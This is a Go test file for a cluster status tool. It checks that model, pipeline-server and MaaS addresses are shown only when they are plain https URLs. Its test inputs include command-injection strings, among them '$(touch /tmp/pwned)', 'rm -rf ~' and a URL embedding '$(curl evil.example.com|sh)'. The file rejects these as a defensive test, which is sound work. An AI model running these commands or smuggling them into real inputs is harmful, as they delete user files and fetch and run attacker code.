package cluster

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/juntwang/rhoai-nightly-updater/pkg/cluster/internal/kube"
	"github.com/juntwang/rhoai-nightly-updater/pkg/cluster/internal/storage"
)

// Addresses read from the cluster go into commands users paste into a
// shell. Only a plain https URL is exposed.
func TestSnippetURL(t *testing.T) {
	for s, want := range map[string]bool{
		"https://inference.apps.example.com/proj/qwen25-05b-instruct": true,
		"https://ds-pipeline-dspa-proj.apps.example.com":              true,
		"https://maas.apps.example.com":                               true,
		"https://host.example.com:8443/a/b":                           true,
		"http://inference.apps.example.com/proj/m":                    false,
		"https://x.example.com/$(touch /tmp/pwned)":                   false,
		"https://x.example.com/`id`":                                  false,
		"https://x.example.com/a';rm -rf ~;'":                         false,
		`https://x.example.com/a"b`:                                   false,
		"https://x.example.com/a b":                                   false,
		"https://user:pw@x.example.com":                               false,
		"https://x.example.com/a?b=1&c=2":                             false,
		"https://x.example.com/a\nb":                                  false,
		"https://":                                                    false,
		"":                                                            false,
	} {
		if got := kube.SnippetURL(s); got != want {
			t.Errorf("snippetURL(%q) = %v, want %v", s, got, want)
		}
	}
}

// A model's status.url and a pipeline server's API address that are not
// plain https URLs are not shown (no Use it or sample commands), and the
// state says why.
func TestStatusHidesUnsafeAddresses(t *testing.T) {
	mc := newModelsCluster(t)
	mc.f.putJSON(testModelPath, `{"metadata":{"labels":{"app.kubernetes.io/managed-by":"rhoai-nightly-updater"},"managedFields":[{"manager":"rhoai-nightly-updater","operation":"Apply"}]},
		"status":{"url":"https://inference.apps.example.com/proj/$(curl evil.example.com|sh)","conditions":[{"type":"Ready","status":"True"}]}}`)
	recordModelFixture(mc.f, testModelPath)
	mc.f.onGet = nil
	st, err := GetResourcesStatus(mc.c)
	if err != nil {
		t.Fatal(err)
	}
	if len(st.Models.Items) != 1 {
		t.Fatalf("items: %+v", st.Models.Items)
	}
	if m := st.Models.Items[0]; m.URL != "" || !strings.Contains(m.Warning, "not a plain https address") {
		t.Fatalf("model: %+v", m)
	}

	var d storage.DSPA
	_ = json.Unmarshal([]byte(`{}`), &d)
	d.Meta.Namespace, d.Meta.Name = "proj", "dspa"
	d.Ready = &storage.DSPACondition{Status: "True"}
	d.APIURL = "https://ds-pipeline-dspa-proj.apps.example.com/`id`"
	if s := storage.PipelineServerState(d, ""); s.APIRoute != "" || !strings.Contains(s.Warning, "not a plain https address") {
		t.Fatalf("pipeline server: %+v", s)
	}
	d.APIURL = "https://ds-pipeline-dspa-proj.apps.example.com"
	if s := storage.PipelineServerState(d, ""); s.APIRoute != d.APIURL {
		t.Fatalf("pipeline server: %+v", s)
	}
}

// The MaaS address is built from the cluster's apps domain: one that would
// make it unsafe is not shown.
func TestMaaSStatus_HidesAnUnsafeAddress(t *testing.T) {
	mc := newMaaSCluster(t)
	mc.f.putJSON("/apis/config.openshift.io/v1/ingresses/cluster", `{"spec":{"domain":"apps.example.com$(id)"}}`)
	st, err := GetMaaSStatus(mc.c)
	if err != nil {
		t.Fatal(err)
	}
	if st.URL != "" {
		t.Fatalf("url = %q", st.URL)
	}
}
